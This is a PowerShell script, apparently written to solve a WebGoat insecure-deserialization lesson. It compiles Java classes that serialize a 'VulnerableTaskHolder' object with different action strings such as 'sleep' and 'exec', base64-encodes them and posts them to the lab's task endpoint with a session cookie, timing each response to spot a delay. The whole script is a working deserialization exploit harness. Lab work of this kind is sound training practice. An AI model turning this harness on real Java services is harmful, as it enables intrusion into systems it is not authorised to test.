# ============================================================
# Try Different Task Actions
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Testing Different Task Actions" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

# Try different actions that might cause delays
$actions = @(
    @{Action="sleep"; Time=5000},
    @{Action="wait"; Time=5000},
    @{Action="delay"; Time=5000},
    @{Action="pause"; Time=5000},
    @{Action="Thread.sleep"; Time=5000},
    @{Action="java.lang.Thread.sleep"; Time=5000},
    @{Action="System.sleep"; Time=5000},
    @{Action="TimeUnit.SECONDS.sleep"; Time=5},
    @{Action="Thread.sleep(5000)"; Time=5000},
    @{Action="noop"; Time=5000},
    @{Action="exec"; Time=5000}
)

$count = 0

foreach ($actionData in $actions) {
    $count++
    $action = $actionData.Action
    $time = $actionData.Time
    
    Write-Host "[$count] Testing action: '$action' with time: $time" -ForegroundColor Yellow
    
    # Generate Java code
    $javaCode = @"
import java.io.*;
import java.util.Base64;

class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = 2L;
    private String taskAction;
    private String taskName;
    private long taskTime;
    
    public VulnerableTaskHolder(String action, String name, long time) {
        this.taskAction = action;
        this.taskName = name;
        this.taskTime = time;
    }
}

public class TestAction${count} {
    public static void main(String[] args) {
        try {
            VulnerableTaskHolder task = new VulnerableTaskHolder("$action", "DelayTask", $time);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(task);
            oos.close();
            System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
        } catch (Exception e) {}
    }
}
"@
    
    $javaCode | Out-File -FilePath "c:\webgoat-scripts-1\TestAction${count}.java" -Encoding ASCII
    $null = javac "c:\webgoat-scripts-1\TestAction${count}.java" 2>&1
    
    if ($LASTEXITCODE -eq 0) {
        $payload = java -cp "c:\webgoat-scripts-1" "TestAction${count}" 2>&1 | Select-Object -Last 1
        
        if ($payload -match "^[A-Za-z0-9+/=]+$") {
            $body = "token=$payload"
            
            try {
                $startTime = Get-Date
                
                $response = Invoke-WebRequest `
                    -Uri "$webGoatUrl/WebGoat/InsecureDeserialization/task" `
                    -Method POST `
                    -Headers $headers `
                    -Body $body `
                    -UseBasicParsing `
                    -TimeoutSec 10
                
                $endTime = Get-Date
                $duration = ($endTime - $startTime).TotalSeconds
                
                $result = $response.Content | ConvertFrom-Json
                
                Write-Host "  Time: $([math]::Round($duration, 2))s" -ForegroundColor White
                Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
                
                if ($result.lessonCompleted -eq $true) {
                    Write-Host ""
                    Write-Host "================================================" -ForegroundColor Green
                    Write-Host "SUCCESS with action: '$action'!" -ForegroundColor Green
                    Write-Host "================================================" -ForegroundColor Green
                    Write-Host "Payload: $payload" -ForegroundColor White
                    exit 0
                }
                
                # Check for 5-second delay
                if ($duration -ge 4.5 -and $duration -le 5.5) {
                    Write-Host "  [5-SECOND DELAY!]" -ForegroundColor Green
                }
                
                # Show different feedback
                if ($result.feedback -notmatch "does not match") {
                    Write-Host "  [DIFFERENT RESPONSE!]" -ForegroundColor Cyan
                }
                
                Write-Host ""
                
            } catch {
                Write-Host "  [ERROR]" -ForegroundColor Red
                Write-Host ""
            }
        }
    }
    
    # Clean up
    Remove-Item -Force "c:\webgoat-scripts-1\TestAction${count}.java" -ErrorAction SilentlyContinue
    Remove-Item -Force "c:\webgoat-scripts-1\TestAction${count}.class" -ErrorAction SilentlyContinue
    Remove-Item -Force "c:\webgoat-scripts-1\VulnerableTaskHolder.class" -ErrorAction SilentlyContinue
}

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "All actions tested" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
